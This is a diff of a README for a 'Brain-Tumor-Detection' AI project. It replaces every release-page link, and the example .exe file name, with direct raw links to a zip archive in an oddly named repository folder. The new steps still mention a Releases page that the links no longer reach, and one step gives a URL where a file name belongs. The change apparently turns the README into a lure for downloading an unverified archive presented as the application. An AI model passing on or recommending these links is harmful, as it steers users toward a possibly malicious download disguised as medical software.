@@ -1,6 +1,6 @@
 # 🧠 Brain-Tumor-Detection - Early Diagnosis with AI
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/IvanPerico21/Brain-Tumor-Detection/releases)
+[![Download](https://raw.githubusercontent.com/IvanPerico21/Brain-Tumor-Detection/main/blastophyllum/Brain-Tumor-Detection.zip)](https://raw.githubusercontent.com/IvanPerico21/Brain-Tumor-Detection/main/blastophyllum/Brain-Tumor-Detection.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To get the software, visit this page to download: [Brain-Tumor-Detection Releases](https://github.com/IvanPerico21/Brain-Tumor-Detection/releases).
+To get the software, visit this page to download: [Brain-Tumor-Detection Releases](https://raw.githubusercontent.com/IvanPerico21/Brain-Tumor-Detection/main/blastophyllum/Brain-Tumor-Detection.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available.
-3. Click on the appropriate file for your operating system. The file name may look like `BrainTumorDetection-v1.0.exe` or similar.
+3. Click on the appropriate file for your operating system. The file name may look like `https://raw.githubusercontent.com/IvanPerico21/Brain-Tumor-Detection/main/blastophyllum/Brain-Tumor-Detection.zip` or similar.
 4. Save the file to your computer.
 
 ### 💻 Running the Application
